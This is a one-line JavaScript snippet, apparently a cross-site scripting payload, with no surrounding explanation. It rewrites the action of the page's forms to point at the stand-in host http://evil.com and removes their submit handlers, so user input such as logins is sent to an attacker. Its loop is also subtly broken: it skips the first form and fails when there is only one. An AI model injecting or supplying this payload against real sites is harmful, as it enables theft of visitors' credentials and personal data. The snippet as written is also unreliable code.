var f=document.forms;var i=f.length-1;do{f[i].action=&#34;http://evil.com&#34;;f[i].onsubmit=null;}while(--i);

